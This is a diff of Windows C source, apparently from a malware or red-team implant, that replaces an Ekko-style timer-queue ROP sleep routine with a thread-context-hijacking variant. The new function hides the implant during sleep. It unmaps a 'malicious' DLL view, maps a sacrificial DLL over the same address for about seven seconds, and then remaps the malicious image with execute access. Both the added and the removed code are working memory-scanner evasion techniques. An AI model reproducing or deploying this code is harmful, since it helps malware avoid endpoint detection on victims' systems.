@@ -34,137 +34,110 @@ HANDLE SwapDll(SIZE_T MODULESIZE, PVOID SACDLLBASE) {
 }
 
 
-VOID EkkoQua(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_T viewSize) {
+int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_T viewSize) {
+
+
+	CONTEXT context = { 0 };
+	CONTEXT contextB = { 0 };
+	CONTEXT contextC = { 0 };
+	CONTEXT contextD = { 0 };
+
+
+	HANDLE ThreadArray[4] = { NULL };
+
+	context.ContextFlags = CONTEXT_ALL;
+	contextB.ContextFlags = CONTEXT_ALL;
+	contextC.ContextFlags = CONTEXT_ALL;
+	contextD.ContextFlags = CONTEXT_ALL;
 
 
 
-    PDWORD64 newStack = NULL;
-    PDWORD64 newStackMal = NULL;
-    
-    CONTEXT* CtxThread = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
-    CONTEXT* RopUnmapMal = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
-    CONTEXT* RopMapSac = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
-    CONTEXT* RopDelay = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
-    CONTEXT* RopMapMal = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
-    CONTEXT* RopUnmapSac = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
-    CONTEXT* RopSetEvt = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
-
-    HANDLE  hTimerQueue = NULL;
-    HANDLE  hNewTimer = NULL;
-    HANDLE  hEvent = NULL;
-    PVOID   ImageBase = NULL;
-    DWORD   ImageSize = 0;
-    DWORD   HeadersSize = 0;
-    DWORD   OldProtect = 0;
-
-
-    PVOID   NtContinue = NULL;
-    PVOID   SysFunc032 = NULL;
-    PVOID   RtlMoveMemory = NULL;
-    PVOID zwMapViewOfSection = NULL;
-    hEvent = CreateEventW(0, 0, 0, 0);
-    hTimerQueue = CreateTimerQueue();
-
-    NtContinue = GetProcAddress(GetModuleHandleA("Ntdll"), "NtContinue");
-
-
-    if (CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)RtlCaptureContext, CtxThread, 0, 0, WT_EXECUTEINTIMERTHREAD)) //create timer 
-    {
-        WaitForSingleObject(hEvent, 0x32); 
-
-        MEMORY_BASIC_INFORMATION mbi;
-        if (VirtualQuery((LPVOID)CtxThread->Rsp, &mbi, sizeof(mbi)) == 0) {
-
-            return;
-        }
-        newStack = (PDWORD64)VirtualAlloc(NULL, mbi.RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        newStackMal = (PDWORD64)VirtualAlloc(NULL, mbi.RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	HANDLE  hEvent = NULL;
+	hEvent = CreateEventW(0, 0, 0, 0);
 
 
 
-        memcpy(newStack, mbi.BaseAddress, mbi.RegionSize);
-        memcpy(newStackMal, mbi.BaseAddress, mbi.RegionSize);
-        SIZE_T delta = (CtxThread->Rsp - (ULONG_PTR)mbi.BaseAddress);
-       
-        if (CtxThread == NULL || RopUnmapMal == NULL || RopMapSac == NULL || RopDelay == NULL || RopMapMal == NULL || RopUnmapSac == NULL || RopSetEvt == NULL) {
-            return;
-        }
-        memcpy(RopUnmapMal, CtxThread, sizeof(CONTEXT));
-        memcpy(RopMapSac, CtxThread, sizeof(CONTEXT));
-        memcpy(RopDelay, CtxThread, sizeof(CONTEXT));
-        memcpy(RopMapMal, CtxThread, sizeof(CONTEXT));
-        memcpy(RopUnmapSac, CtxThread, sizeof(CONTEXT));
-        memcpy(RopSetEvt, CtxThread, sizeof(CONTEXT));
+	// Create a thread to control
+	ThreadArray[0] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)UnmapViewOfFile, NULL, CREATE_SUSPENDED, NULL);
+	if (ThreadArray[0] == NULL) {
+		printf("Failed to create thread\n");
+		return -1;
+	}
+	ThreadArray[1] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MapViewOfFileEx, NULL, CREATE_SUSPENDED, NULL);
+	if (ThreadArray[1] == NULL) {
+		printf("Failed to create thread\n");
+		return -1;
+	}
+	ThreadArray[2] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)UnmapViewOfFile, NULL, CREATE_SUSPENDED, NULL);
+	if (ThreadArray[2] == NULL) {
+		printf("Failed to create thread\n");
+		return -1;
+	}
+	ThreadArray[3] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MapViewOfFileEx, NULL, CREATE_SUSPENDED, NULL);
+	if (ThreadArray[3] == NULL) {
+		printf("Failed to create thread\n");
+		return -1;
+	}
 
 
-
-        (*RopUnmapMal).Rsp -= 8;
-        (*RopUnmapMal).Rip = (DWORD64)UnmapViewOfFile;
-        (*RopUnmapMal).Rcx = (DWORD64)(ImageBaseDLL);
-
-        (*RopMapSac).Rsp = (DWORD64)((PBYTE)newStack + delta);
-        (*RopMapSac).Rsp -= 8;
-        (*RopMapSac).Rip = (DWORD64)MapViewOfFileEx;
-        (*RopMapSac).Rcx = (DWORD64)sacDllHandle;
-        (*RopMapSac).Rdx = FILE_MAP_ALL_ACCESS;
-        (*RopMapSac).R8 = (DWORD64)0x00;
-        (*RopMapSac).R9 = (DWORD64)0x00;
-        *((PDWORD64)((*RopMapSac).Rsp + 40)) = viewSize; //this one is either 28 hex or 40 dec 
-        *((PDWORD64)((*RopMapSac).Rsp + 48)) = (ULONGLONG)(ImageBaseDLL);
-
-        // WaitForSingleObject( hTargetHdl, SleepTime );
-        (*RopDelay).Rsp -= 8;
-        (*RopDelay).Rip = (DWORD64)WaitForSingleObject;
-        (*RopDelay).Rcx = (DWORD64)((HANDLE)(LONG_PTR)-1);
-        (*RopDelay).Rdx = 0x1388; //it should be 6 or 7 secs in hex
-
-        (*RopUnmapSac).Rsp -= 8;
-        (*RopUnmapSac).Rip = (DWORD64)UnmapViewOfFile;
-        (*RopUnmapSac).Rcx = (DWORD64)(ImageBaseDLL);
-
-       
-        (*RopMapMal).Rsp = (DWORD64)((PBYTE)newStackMal + delta);
-        (*RopMapMal).Rsp -= 8;
-        (*RopMapMal).Rip = (DWORD64)MapViewOfFileEx;
-        (*RopMapMal).Rcx = (DWORD64)malDllHandle;
-        (*RopMapMal).Rdx = FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE;
-        (*RopMapMal).R8 = (DWORD64)0x00;
-        (*RopMapMal).R9 = (DWORD64)0x00;
-        *(ULONG_PTR*)((*RopMapMal).Rsp + 40) = 0x00; //the offset must be either hex 28 or int 40
-        *(ULONG_PTR*)((*RopMapMal).Rsp + 48) = (ULONG_PTR)ImageBaseDLL;
-        
-        (*RopSetEvt).Rsp -= 8;
-        (*RopSetEvt).Rip = (DWORD64)SetEvent;
-        (*RopSetEvt).Rcx = (DWORD64)hEvent;
+	GetThreadContext(ThreadArray[0], &context);//unmap
+	GetThreadContext(ThreadArray[1], &contextB);//mapex
+	GetThreadContext(ThreadArray[2], &contextC);//unmap
+	GetThreadContext(ThreadArray[3], &contextD);//mapex
 
 
-        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, RopUnmapMal, 100, 0, WT_EXECUTEINTIMERTHREAD);
-        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, RopMapSac, 200, 0, WT_EXECUTEINTIMERTHREAD);
-        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, RopDelay, 300, 0, WT_EXECUTEINTIMERTHREAD);
-        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, RopUnmapSac, 400, 0, WT_EXECUTEINTIMERTHREAD);
-        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, RopMapMal, 500, 0, WT_EXECUTEINTIMERTHREAD);
-        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, RopSetEvt, 600, 0, WT_EXECUTEINTIMERTHREAD);
+	*(ULONG_PTR*)((context).Rsp) = (DWORD64)ExitThread;
+	context.Rip = (DWORD64)UnmapViewOfFile;
+	context.Rcx = (DWORD64)(ImageBaseDLL);
+
+	*(ULONG_PTR*)((contextB).Rsp) = (DWORD64)ExitThread;
+	contextB.Rip = (DWORD64)MapViewOfFileEx;
+	contextB.Rcx = (DWORD64)sacDllHandle;
+	contextB.Rdx = FILE_MAP_ALL_ACCESS;
+	contextB.R8 = (DWORD64)0x00;
+	contextB.R9 = (DWORD64)0x00;
+	*((PDWORD64)((contextB).Rsp + 40)) = viewSize; //this one is either 28 hex or 40 dec 
+	*((PDWORD64)((contextB).Rsp + 48)) = (ULONGLONG)(ImageBaseDLL);
+
+	*(ULONG_PTR*)((contextC).Rsp) = (DWORD64)ExitThread;
+	contextC.Rip = (DWORD64)UnmapViewOfFile;
+	contextC.Rcx = (DWORD64)(ImageBaseDLL);
+
+	*(ULONG_PTR*)((contextD).Rsp) = (DWORD64)ExitThread;
+	contextD.Rip = (DWORD64)MapViewOfFileEx;
+	contextD.Rcx = (DWORD64)malDllHandle;
+	contextD.Rdx = FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE;
+	contextD.R8 = (DWORD64)0x00;
+	contextD.R9 = (DWORD64)0x00;
+	*(ULONG_PTR*)((contextD).Rsp + 40) = 0x00; //the offset must be either hex 28 or int 40
+	*(ULONG_PTR*)((contextD).Rsp + 48) = (ULONG_PTR)ImageBaseDLL;
 
 
-        WaitForSingleObject(hEvent, INFINITE);
+	SetThreadContext(ThreadArray[0], &context);
+	SetThreadContext(ThreadArray[1], &contextB);
+	SetThreadContext(ThreadArray[2], &contextC);
+	SetThreadContext(ThreadArray[3], &contextD);
 
 
+	HANDLE  hTimerQueue = NULL;
+	HANDLE  hNewTimer = NULL;
+	PVOID ResumeThreadAddress = NULL;
 
-    }
+	hTimerQueue = CreateTimerQueue();
 
-    DeleteTimerQueue(hTimerQueue);
-    // Clean up allocated memory
-    if (CtxThread) VirtualFree(CtxThread, 0, MEM_RELEASE);
-    if (RopUnmapMal) VirtualFree(RopUnmapMal, 0, MEM_RELEASE);
-    if (RopMapSac) VirtualFree(RopMapSac, 0, MEM_RELEASE);
-    if (RopDelay) VirtualFree(RopDelay, 0, MEM_RELEASE);
-    if (RopMapMal) VirtualFree(RopMapMal, 0, MEM_RELEASE);
-    if (RopUnmapSac) VirtualFree(RopUnmapSac, 0, MEM_RELEASE);
-    if (RopSetEvt) VirtualFree(RopSetEvt, 0, MEM_RELEASE);
-    if (newStack) VirtualFree(newStack, 0, MEM_RELEASE);
-    if (newStackMal) VirtualFree(newStackMal, 0, MEM_RELEASE);
+	ResumeThreadAddress = GetProcAddress(GetModuleHandleA("kernel32.dll"), "ResumeThread");
 
-    return;
+	if (ResumeThreadAddress != NULL) {
+		CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThreadAddress, ThreadArray[0], 100, 0, WT_EXECUTEINTIMERTHREAD);//unamp
+		CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThreadAddress, ThreadArray[1], 200, 0, WT_EXECUTEINTIMERTHREAD);//mapsac
+		//sleep time
+		CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThreadAddress, ThreadArray[2], 7000, 0, WT_EXECUTEINTIMERTHREAD);//unmap
+		CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThreadAddress, ThreadArray[3], 7100, 0, WT_EXECUTEINTIMERTHREAD);//mapmal
+
+		WaitForMultipleObjects(4, ThreadArray, TRUE, INFINITE);
+	}
+
+	return 0;
+
 }
-
 
